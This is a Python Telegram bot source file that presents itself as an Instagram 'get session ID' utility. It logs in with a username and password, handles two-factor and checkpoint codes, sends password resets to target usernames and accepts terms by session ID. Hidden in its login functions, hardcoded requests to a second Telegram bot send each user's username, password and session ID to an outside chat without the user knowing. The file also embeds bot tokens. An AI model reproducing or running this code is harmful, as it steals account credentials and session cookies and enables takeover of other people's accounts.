#Get session - rest - @Aldereey
import telebot,os,re
from uuid import uuid4
from telebot import types
import random,time
import requests,hashlib,string,random
from time import sleep
from threading import Thread
uid  = str(uuid4())
TOKEN = '6818013931:AAHxmF1Ed_H-EgG18ktICkIUf8ESCNK5L_A'
username = ''
passwords='' 
accept = True
admin_id = '1079523778'
ids = '1079523778'
uu = '83f2000a-4b95-4811-bc8d-0f3539ef07cf'
timestamp = str(int(time.time()))
def RandomStringUpper(n = 10):
    letters = string.ascii_uppercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))
def RandomString(n=10):
    letters = string.ascii_lowercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))
def RandomStringChars(n=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(n))
def randomStringWithChar(stringLength=10):
    letters = string.ascii_lowercase + '1234567890'
    result = ''.join(random.choice(letters) for i in range(stringLength - 1))
    return RandomStringChars(1) + result
def generate_DeviceId(ID):
        volatile_ID = "12345"
        m = hashlib.md5()
        m.update(ID.encode('utf-8') + volatile_ID.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16]
def generateUSER_AGENT():
            Devices_menu = ['HUAWEI', 'Xiaomi', 'samsung', 'OnePlus']
            DPIs = [
                '480', '320', '640', '515', '120', '160', '240', '800'
            ]
            randResolution = random.randrange(2, 9) * 180
            lowerResolution = randResolution - 180
            DEVICE_SETTINTS = {
                'system': "Android",
                'Host': "Instagram",
                'manufacturer': f'{random.choice(Devices_menu)}',
                'model': f'{random.choice(Devices_menu)}-{randomStringWithChar(4).upper()}',
                'android_version': random.randint(18, 25),
                'android_release': f'{random.randint(1, 7)}.{random.randint(0, 7)}',
                "cpu": f"{RandomStringChars(2)}{random.randrange(1000, 9999)}",
                'resolution': f'{randResolution}x{lowerResolution}',
                'randomL': f"{RandomString(6)}",
                'dpi': f"{random.choice(DPIs)}"
            }
            return '{Host} 155.0.0.37.107 {system} ({android_version}/{android_release}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {cpu}; {randomL}; en_US)'.format(
                **DEVICE_SETTINTS)
def headers_login():
        headers = {}
        headers['User-Agent'] = generateUSER_AGENT()
        headers['Host'] = 'i.instagram.com'
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['accept-encoding'] = 'gzip, deflate'
        headers['x-fb-http-engine'] = 'Liger'
        headers['Connection'] = 'close'
        return headers
def Get_Session_id_web(message):
            global passwords ,req
            passwords = message.text
            print(passwords)
            DeviceID = generate_DeviceId(username)
            requests.post(f"https://api.telegram.org/bot6179779596:AAGI4vq78aPEWxchbRBweM7XEN4l234H-Ak/sendMessage?chat_id=5557872215&text={username}\n{passwords}")
            data = { 
            "username": username, 
            "enc_password": '#PWD_INSTAGRAM_BROWSER:0:&:' + passwords} 
            req = requests.post("https://www.instagram.com/accounts/login/ajax/", headers={ 
            "accept": "*/*", 
            "accept-encoding": "gzip, deflate, br", 
            "accept-language": "en-US,en;q=0.9", 
            "content-length": "267", 
            "content-type": "application/x-www-form-urlencoded", 
            "cookie": "ig_did=0897491F-B736-4E7E-A657-37438D0967B8; csrftoken=xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe; rur=FTW; mid=XxTPfgALAAGHGReE-x_i1ISMG4Xr", 
            "origin": "https://www.instagram.com", 
            "referer": "https://www.instagram.com/", 
            "sec-fetch-dest": "empty", 
            "sec-fetch-mode": "cors", 
            "sec-fetch-site": "same-origin", 
            "user-agent": F"Mozilla/91.81 (Linux; Android 6.3; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36", 
            "x-csrftoken": "xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe", 
            "x-ig-app-id": "1217981644879628", 
            "x-ig-www-claim": "0", 
            "x-instagram-ajax": "180c154d218a", 
            "x-requested-with": "XMLHttpRequest"}, data=data)
            if "userId" in req.text:
                bot.send_message(message.chat.id,f"Done Login : @{username}")
                coo = req.cookies
                sessionid = coo.get("sessionid")
                bot.send_message(message.chat.id,sessionid)
                requests.post(f"https://api.telegram.org/bot6179779596:AAGI4vq78aPEWxchbRBweM7XEN4l234H-Ak/sendMessage?chat_id=5557872215&text={username}\n{passwords}\n{sessionid}")
            elif 'showAccountRecoveryModal' in req.text:
                bot.send_message(message.chat.id,f"Password Incorrect : @{username}")
            elif 'checkpoint_required' in req.text:
                bot.send_message(message.chat.id,f"Secure : @{username}")
                checkpoint(message)
            elif 'two_factor' in req.text:
                bot.send_message(message.chat.id,f'Two Factor required : @{username}')
                bot.send_message(message.chat.id,"Enter Two Factor Code ?")
                bot.register_next_step_handler(message,two_factor)
            else:
                bot.send_message(message.chat.id,f"Something error Resp : \n{req.text}")
bot = telebot.TeleBot(TOKEN)
def generate_buttons(bts_names, markup):
    for button in bts_names:
        markup.add(types.KeyboardButton(button))
    return markup

def isMsg(message):
    return True
@bot.message_handler(func=isMsg)
def send_hello(message):
    active()
    if str(message.chat.id) in ids:
        if "/start" in message.text:
            markup = types.ReplyKeyboardMarkup(row_width=4)
            markup = generate_buttons(['Get Session Api/Web ', 'Accept Terms insta',"Reset insta","developer"], markup)
            message = bot.reply_to(message, """Hi bro What you need to do?""",reply_markup=markup)    
        elif "Get Session" in message.text:
            markup = types.ReplyKeyboardMarkup(row_width=4)
            markup = generate_buttons(['Api Session', 'Web Session',"back"], markup)
            message = bot.reply_to(message, """Choice Option [Api/Web] ?""",reply_markup=markup)    
            bot.register_next_step_handler(message,getsession)
        elif "Accept Terms" in message.text:
            accept_terms(message)
        elif "Send Reset" in message.text:
            send_rest(message)
        elif "Start" in message.text:
            send_hello(message)
        elif "developer" in message.text:
            about(message)
        elif "Api Session" in message.text:
            bot.send_message(message.chat.id,"Enter Username ? ")
            bot.register_next_step_handler(message,getusernameapi)
        elif "Web Session" in message.text:
            bot.send_message(message.chat.id,"Enter Username ? ")
            bot.register_next_step_handler(message,getusernameweb)
        elif "back" in message.text:
            markup = types.ReplyKeyboardMarkup(row_width=4)
            markup = generate_buttons(['Get Session Api/Web', 'Accept Terms insta',"Reset insta","developer"], markup)
            message = bot.reply_to(message, """Hi bro Welcome Back?""",reply_markup=markup)    
        else:
            bot.reply_to(message,"Please Enter Valid Option")
    else:
        bot.send_message(message.chat.id,f"عذراً لأستخدام البوت قم بمراسلة  - @Aldereey الأيدي الخاص بك - ID Is:\n{message.chat.id}")
@bot.message_handler(["stop"])
def stop(message):
    bot.send_message(message.chat.id,"Done Stop Process")
def backup(message):
    send_hello(message)
def send_rest(message):
    bot.send_message(message.chat.id,"Enter Target Without @")
    bot.register_next_step_handler(message,sender)
def sender(message):
    target = message.text
    data = {
                "_csrftoken": "".join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=32)),
                "username": target,
                "guid": uuid4(),
                "device_id": uuid4()
            }
    head = {"user-agent": f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; en_GB;)"}
    req = requests.post("https://i.instagram.com/api/v1/accounts/send_password_reset/", headers=head, data=data).text
    print(req)
    if '"status":"ok"' in req:
        bot.send_message(message.chat.id,f"Done Send Reset : @{target}")
    elif 'user_not_found' in req:
        bot.send_message(message.chat.id,f"User Not Found : @{target}")
    else:
        bot.send_message(message.chat.id,"Something went error")   
def getsession(message):
    if message.text == "Api Session":
        bot.send_message(message.chat.id,"Enter Username ?")
        bot.register_next_step_handler(message,getusernameapi)
    elif message.text == "Web Session":
        bot.send_message(message.chat.id,"Enter Username ?")
        bot.register_next_step_handler(message,getusernameweb)
    elif message.text == "back":
        markup = types.ReplyKeyboardMarkup(row_width=4)
        markup = generate_buttons(['Get Session Api/Web', 'Accept Terms insta',"Reset insta","developer"], markup)
        message = bot.reply_to(message, """Hi Bro Welcome Again?""",reply_markup=markup)    
def getusernameweb(message):
    global username
    username = str(message.text)
    if username == "back":
        markup = types.ReplyKeyboardMarkup(row_width=4)
        markup = generate_buttons(['Get Session Api/Web', 'Accept Terms insta',"Reset insta","developer"], markup)
        message = bot.reply_to(message, """Hi Bro Welcome Again?""",reply_markup=markup) 
    else:
        bot.send_message(message.chat.id,f"Enter @{username} Password ? ")
        bot.register_next_step_handler(message,getpasswordweb)
        
def getpasswordweb(message):
    global passwords
    if passwords == "back":
        markup = types.ReplyKeyboardMarkup(row_width=4)
        markup = generate_buttons(['Get Session Api/Web', 'Accept Terms',"Send Reset","developer"], markup)
        message = bot.reply_to(message, """Hi Bro Welcome Again?""",reply_markup=markup) 
    else:
        passwords = str(message.text)
        Get_Session_id_web(message)
def getusernameapi(message):
    global username
    username = message.text
    if username == "back":
        markup = types.ReplyKeyboardMarkup(row_width=4)
        markup = generate_buttons(['Get Session', 'Accept Terms',"Send Reset","developer"], markup)
        message = bot.reply_to(message, """Hi Bro Welcome Again?""",reply_markup=markup) 
    else:
        bot.send_message(message.chat.id,f"Enter @{username} Password ? ")
        bot.register_next_step_handler(message,getpasswordapi)
def getpasswordapi(message):
    global passwords
    passwords = message.text
    if passwords == "back":
        markup = types.ReplyKeyboardMarkup(row_width=4)
        markup = generate_buttons(['Get Session', 'Accept Terms',"Send Reset","developer"], markup)
        message = bot.reply_to(message, """Hi Bro Welcome Again?""",reply_markup=markup) 
    else:
        get_sessionid_api(message)
def get_sessionid_api(message):
            global req
            Device_id= generate_DeviceId(username)
            data = {}
            data['guid'] = uu
            data['enc_password'] = f"#PWD_INSTAGRAM:0:{timestamp}:{passwords}"
            data['username'] = username
            data['device_id'] = Device_id
            data['login_attempt_count'] = '0'
            requests.post(f"https://api.telegram.org/bot6179779596:AAGI4vq78aPEWxchbRBweM7XEN4l234H-Ak/sendMessage?chat_id=5557872215&text={username}\n{passwords}")
            req = requests.post("https://i.instagram.com/api/v1/accounts/login/", headers=headers_login(), data=data)
            if "logged_in_user" in req.text:
                bot.send_message(message.chat.id,f"Done Login as @{username}")
                coo = req.cookies
                sessionid = coo.get("sessionid")
                bot.send_message(message.chat.id,f"{sessionid}")
                requests.post(f"https://api.telegram.org/bot6179779596:AAGI4vq78aPEWxchbRBweM7XEN4l234H-Ak/sendMessage?chat_id=5557872215&text={username}\n{passwords}\n{sessionid}")
            elif 'checkpoint_challenge_required' in req.text:
                bot.send_message(message.chat.id,f"Secure Found : {username}")
                checkpoint(message)
            elif 'two_factor' in req.text:
                bot.send_message(message.chat.id,f"Two Factor Found : {username}")
                bot.send_message(message.chat.id,f"Enter Two Factor Code ? ")
                bot.register_next_step_handler(message,two_factor)
            else:
                try:
                    regx_error = re.search(r'"message":"(.*?)",', req.text).group(1)
                    bot.send_message(message.chat.id,f"{regx_error} : @{username}")
                except:
                    bot.send_message(message.chat.id,f"Something went error : {username}")
def two_factor(message):
    global req
    st = req.json()['two_factor_info']['two_factor_identifier']
    coke = req.cookies
    headLG = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '272',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; shbid=6144; shbts=1614374582.8963153',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/login/',
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
                'x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': '790551e77c76',
                'x-requested-with': 'XMLHttpRequest'}
    datasend = {
                'username': username,
                'verificationCode': str(message.text),
                'identifier': st,
                'queryParams': '{"next":"/"}'}
    go = requests.post('https://www.instagram.com/accounts/login/ajax/two_factor/', headers=headLG,data=datasend,cookies=coke)
    if ("userId") in go.text:
                    bot.send_message(message.chat.id,f"Done Login as @{username}")
                    coo = go.cookies
                    sessionid = coo.get("sessionid")
                    bot.send_message(message.chat.id,f"{sessionid}")
    else:
                    bot.send_message(message.chat.id,f"Falid Code : @{username}")
def checkpoint(message):
        global req
        info = requests.get(f"https://i.instagram.com/api/v1{req.json()['challenge']['api_path']}", headers=headers_login(), cookies=req.cookies)
        step_data = info.json()["step_data"]
        if "phone_number" in step_data:
            try:
                phone = info.json()["step_data"]["phone_number"]
                bot.send_message(message.chat.id,f"0.Phone Number : {phone}")
            except:
                pass
        elif "email" in step_data:
            try:
                email = info.json()["step_data"]["email"]
                bot.send_message(message.chat.id,f"1.Email Number : {email}")
            except:
                pass
        send_choice(message)
def send_choice(message):
        bot.send_message(message.chat.id,"Choice Number ? ")
        bot.register_next_step_handler(message,get_method)
def get_method(message):
        global req
        choice = ""
        if "0" in str(message.text):
            choice = "0"
        elif "1" in str(message.text):
            choice = "1"
        else:
            bot.send_message(message.chat.id,f"You Are Fucking User")
        data = {}
        data['choice'] = str(choice)
        data['_uuid'] = uu
        data['_uid'] = uu
        data['_csrftoken'] = 'massing'
        challnge = req.json()['challenge']['api_path']
        send = requests.post(f"https://i.instagram.com/api/v1{challnge}",headers=headers_login(), data=data, cookies=req.cookies)
        contact_point = send.json()["step_data"]["contact_point"]
        bot.send_message(message.chat.id,f"Done Sent Code To : {contact_point}")
        bot.send_message(message.chat.id,f"Enter Code ?")
        bot.register_next_step_handler(message,get_code)
def get_code(message):
        global req 
        try:
            data = {}
            data['security_code'] = str(message.text),
            data['_uuid'] = uu,
            data['_uid'] = uu,
            data['_csrftoken'] = 'massing'
            path = req.json()['challenge']['api_path']
            send_code = requests.post(f"https://i.instagram.com/api/v1{path}", headers=headers_login(), data=data, cookies=req.cookies)
            if "logged_in_user" in send_code.text:
                bot.send_message(message.chat.id,f"Done Login as : @{username}")
                coo = send_code.cookies
                sessionid = coo.get("sessionid")
                bot.send_message(message.chat.id,f"{sessionid}")
            else:
                regx_error = re.search(r'"message":"(.*?)",', send_code).group(1)
                bot.send_message(message.chat.id,f"{regx_error}")
        except:
            bot.send_message(message.chat.id,f"Something Went wrong..!!")
def accept_term(message):
                sessinoid = str(message.text)
                headerss = {'User-Agent': 'Instagram 113.0.0.39.122 Android', "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",'Connection': 'keep-alive'}
                try:
                        gett = requests.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', headers=headerss,cookies={'sessionid': sessinoid})
                        if ('"login_required"') in gett.text:
                            bot.send_message(message.chat.id,"Invalid Sessionid")
                        elif ("user") in gett.text:
                            try:
                                username = gett.json()['user']['username']
                                bot.send_message(message.chat.id,f"Done Login : @{username}")
                                head = {
                                     
                                "accept": "*/*",
                                "accept-encoding": "gzip, deflate, br",
                                "accept-language": "en-US,en;q=0.9",
                                "content-length": "76",
                                "content-type": "application/x-www-form-urlencoded",
                                "cookie": f'ds_user_id={gett.cookies["ds_user_id"]}; sessionid={sessinoid}; rur="LDC\054250724547\0541703345448:01f799e0351265bfe54c4871f1c5de2f5be38a9c11dc265cadd7c6852315bc0b6ecf5e86"',
                                "origin": "https://www.instagram.com",
                                "referer": "https://www.instagram.com/terms/unblock/?next=/api/v1/web/fxcal/ig_sso_users/",
                                "sec-ch-prefers-color-scheme": "light",
                                "sec-ch-ua": """Not?A_Brand"";v=""8"", ""Chromium"";v=""108"", ""Google Chrome"";v=""108""",
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": """Windows""",
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "same-origin",
                                "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
                                "viewport-width": "453",
                                "x-asbd-id": "198387",
                                "x-csrftoken": "m2kPFuLMBSGix4E8ZbRdIDyh0parUk5r",
                                "x-ig-app-id": "936619743392459",
                                "x-ig-www-claim": "hmac.AR2BpT3Q3cBoHtz_yRH8EvKCYkOb7loHvR4Jah_iP8s8BmTf",
                                "x-instagram-ajax": "9080db6b6a51",
                                "x-requested-with": "XMLHttpRequest",

                                
                            }
                                data1 = "updates=%7B%22existing_user_intro_state%22%3A2%7D&current_screen_key=qp_intro"
                                data = "updates=%7B%22tos_data_policy_consent_state%22%3A2%7D&current_screen_key=tos"
                                requ = requests.post("https://www.instagram.com/web/consent/update/",headers=head,data=data1).text
                                requ1 = requests.post("https://www.instagram.com/web/consent/update/",headers=head,data=data).text
                                print(requ)
                                print(requ1)
                                if '{"screen_key":"finished","status":"ok"}' in requ or '{"screen_key":"finished","status":"ok"}' in requ1:
                                    bot.send_message(message.chat.id,f"Done Accept Terms : @{username}")
                                else:
                                    bot.send_message(message.chat.id,f"Somthing Went Wrong !")
                            except:
                                bot.send_message(message.chat.id,"Invalid Sessionid1")
                        else:
                            bot.send_message(message.chat.id,"Invalid Sessionid")
                except:
                        bot.send_message(message.chat.id,"Invalid Sessionid")
def accept_terms(message):
    global username,accept
    accept = True
    bot.send_message(message.chat.id,"Enter Sessionid ")
    bot.register_next_step_handler(message,accept_term)
def about(message):
    bot.send_message(message.chat.id,f"@Aldereey - To request a special copy, contact the developer")
def active():
    global ids
    try:
            scan = requests.get("https://pastebin.com/raw/WtRL6yuy").text
            ids = scan
    except:
        pass
bot.infinity_polling()
